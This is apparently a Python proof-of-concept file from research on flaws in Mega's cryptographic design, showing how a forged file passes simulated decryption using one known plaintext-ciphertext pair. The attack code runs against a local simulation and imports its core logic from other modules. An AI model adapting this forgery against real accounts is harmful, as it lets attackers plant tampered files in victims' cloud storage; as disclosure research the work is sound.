
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the integrity attack on the simulated operations of Mega.
#

from os.path import basename
from secrets import token_bytes

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from shared.constants.victim import *
from issue_04.integrity_attack import MegaIntegrityAttack


class PoCAbstractIntegrityAttack:
    def __init__(self):
        print("# Initialize abstract integrity attack PoC")
        self.attack = MegaIntegrityAttack()

        print(f"## Generate fresh master key")
        self.kM = token_bytes(MASTER_KEY_BYTE_LEN)

    def _get_pt_ct_pair(self):
        pt = token_bytes(AES_BLOCK_BYTE_SIZE)
        ct = aes_encrypt(pt, self.kM)
        return pt, ct

    def integrity_attack(self, fname):
        """
        This very simple PoC just shows how one can forge a file from a single
        plaintext-ciphertext pair, which passes the (simulated) Mega file decryption.

        :params fname: name of the file that the attack places maliciously
        """

        # Generate plaintext-ciphertext pair
        pt, ct = self._get_pt_ct_pair()
        self.attack.set_known_pt(pt)
        self.attack.set_known_ct(ct)

        # Forge file
        self.attack.forge_node_key()
        fc, fc_enc, attr_enc = self.attack.forge_file_ct(fname)

        key_ct = self.attack.forged_obf_key_ct
        fc_exp, attr = chunkwise_file_decryption(self.kM, fc_enc, key_ct, attr_enc)
        assert fc_exp == fc
        assert attr["n"] == basename(fname)

    def run_attack(self):
        print("## Starting abstract attack")
        self.integrity_attack(FORGE_FILE_NAME)
        print("### Attack: successful!")
